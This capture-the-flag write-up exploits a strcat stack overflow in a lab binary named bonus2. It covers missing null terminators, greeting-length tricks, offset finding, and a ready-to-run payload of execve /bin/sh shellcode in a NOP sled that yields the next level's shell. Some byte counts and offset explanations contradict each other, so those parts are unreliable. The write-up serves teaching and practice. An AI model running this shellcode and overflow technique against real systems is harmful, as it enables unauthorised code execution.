# PART 2: Vulnerability Summary

## The Vulnerability Chain

### 1. strncpy without null terminator
```c
strncpy(buffer, argv[1], 40);  // No \0 if argv[1] >= 40 bytes
strncpy(buffer+40, argv[2], 32);  // Continues after first buffer
```

If `argv[1]` is exactly 40 bytes, no null terminator is added.

### 2. Language-dependent greeting size
```c
if (LANG starts with "fi"):
    greeting = "Hyvää päivää "  // 14 bytes (19 with UTF-8 encoding)
else if (LANG starts with "nl"):
    greeting = "Goedemiddag! "  // 14 bytes
else:
    greeting = "Hello "  // 7 bytes
```

Finnish greeting is longest, maximizing overflow potential.

### 3. strcat without bounds checking
```c
char local_buffer[72];
strcpy(local_buffer, greeting);
strcat(local_buffer, argument);  // No size validation!
```

`strcat` appends `argument` without checking if it fits in 72 bytes.

## Memory Layout

```
Stack (greetuser function):
┌─────────────────────┐ ebp-0x48
│   local_buffer[72]  │ ← strcat destination
│                     │
├─────────────────────┤ ebp
│   Saved EBP         │
├─────────────────────┤ ebp+4
│   Return Address    │ ← Overwrite target
└─────────────────────┘
```

## Overflow Calculation

**With LANG=fi:**
```
Greeting: "Hyvää päivää " = 19 bytes (UTF-8)
argv[1]: 40 bytes (no \0)
argv[2]: starts immediately after

Total in buffer after strcat:
19 (greeting) + 40 (argv[1]) + N (argv[2]) bytes
```

**To reach EIP at ebp+4:**
```
Buffer size: 72 bytes
Distance to EIP: 72 + 4 = 76 bytes

76 - 19 (greeting) - 40 (argv[1]) = 17 bytes

But we need 18 bytes padding + 4 bytes (address) = 22 bytes in argv[2]
```

## Why 18 Bytes Padding?

From our pattern test:
```
Pattern: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
EIP overwritten with: 0x46464545 (EEFF)

EEEE position: byte 16-19 in argv[2]
But actual offset needed: 18 bytes

This accounts for:
- Alignment
- The way strcat copies data
- Stack layout specifics
```

## The Exploit Flow

### 1. Setup environment
```bash
export LANG=fi          # Use Finnish for longest greeting
export SHELLCODE=...    # Store shellcode in environment
```

### 2. First argument (argv[1])
```
"A" * 40
```
- Fills exactly 40 bytes
- No null terminator (critical!)
- `strncpy` copies exactly 40 bytes

### 3. Second argument (argv[2])
```
"B" * 18 + "\x80\xf8\xff\xbf"
```
- 18 bytes padding
- 4 bytes: shellcode address (0xbffff880)

### 4. Execution flow
```
1. main() copies argv[1] → buffer (40 bytes, no \0)
2. main() copies argv[2] → buffer+40 (32 bytes)
3. main() copies buffer → stack and calls greetuser()
4. greetuser() copies "Hyvää päivää " → local_buffer
5. greetuser() calls strcat(local_buffer, stack_arg)
6. strcat sees no \0 in greeting+argv[1] combo
7. Continues copying, overflows past 72 bytes
8. Overwrites return address with 0xbffff880
9. Function returns → EIP = 0xbffff880
10. Jumps to NOP sled → slides to shellcode
11. Shellcode executes → /bin/sh as bonus3!
```

## Key Concepts

### strncpy Behavior
```c
strncpy(dest, src, n);
```
- Copies exactly `n` bytes
- Only adds `\0` if `src` length < `n`
- If `src` length >= `n`, **no null terminator!**

### strcat Vulnerability
```c
strcat(dest, src);
```
- Searches for `\0` in `dest`
- Appends `src` after the `\0`
- **No bounds checking!**
- If no `\0` found, keeps reading/writing beyond buffer

### Language-Based Exploitation
Different greetings = different buffer consumption:
```
"Hello " (7) + 40 + 32 = 79 bytes total
"Hyvää päivää " (19) + 40 + 32 = 91 bytes total
```

Finnish provides the most overflow (91 - 72 = 19 bytes).

### NOP Sled Purpose
```
Memory:
0xbffff828: [NOP][NOP][NOP]...[shellcode]
            ↑                  ↑
         Start             Actual code
```

Jump anywhere in NOPs → slides to shellcode → guaranteed execution.

## Why This Works

1. **No null terminator:** `strncpy` with full 40 bytes leaves no `\0`
2. **strcat continues:** Treats greeting+argv[1]+argv[2] as one string
3. **Finnish greeting:** Maximizes overflow distance
4. **Buffer overflow:** 91 bytes > 72 bytes = 19 byte overflow
5. **EIP control:** Overflow reaches return address at ebp+4
6. **Shellcode in env:** NOP sled provides large, reliable target
7. **ASLR disabled:** Environment addresses are predictable

## Security Lessons

1. **Always null-terminate strings** after `strncpy`
2. **Never use strcat** - use `strncat` with size limits
3. **Validate buffer sizes** before concatenation
4. **Use safe string functions** (`strlcpy`, `strlcat`)
5. **Don't trust user input length**
6. **Enable ASLR** to randomize addresses
7. **Use stack canaries** to detect overflows



# Bonus2 - strcat Buffer Overflow with Language Selection

## Vulnerability
Program uses `strncpy` (40+32 bytes) without null terminator, then `strcat` without bounds checking in `greetuser()`.

**Weakness:** `strcat` continues past buffer when no `\0` exists.

## Exploit
Language-dependent greetings have different lengths:
```
LANG=""   → "Hello " (7 bytes)
LANG="fi" → "Hyvää päivää " (19 bytes UTF-8)
LANG="nl" → "Goedemiddag! " (14 bytes)
```

Using Finnish (longest): `19 + 40 + 22 = 81 bytes > 72 byte buffer`

## Memory Layout
```
ebp-0x48: buffer[72]      ← strcat destination
ebp+4:    return address  ← overwrite target (18 bytes into argv[2])
```

## Finding Offset
```gdb
Pattern: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
EIP = 0x46464545 (EEFF)
Offset: 18 bytes in argv[2]
```

## Payload
```bash
export LANG=fi
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x80\xf8\xff\xbf"')
```

- `"A"*40`: Fill first buffer (no `\0`)
- `"B"*18`: Padding to EIP
- `\x80\xf8\xff\xbf`: Shellcode address in NOP sled

## Result
`strcat` treats greeting+argv[1]+argv[2] as continuous string → overflows → overwrites EIP → jumps to shellcode → shell as bonus3!

## Key Concepts
- **strncpy without null:** No `\0` when copying exactly N bytes
- **strcat overflow:** Continues past buffer without `\0`
- **Language exploitation:** Different greeting lengths affect overflow
- **NOP sled:** Large target for reliable shellcode execution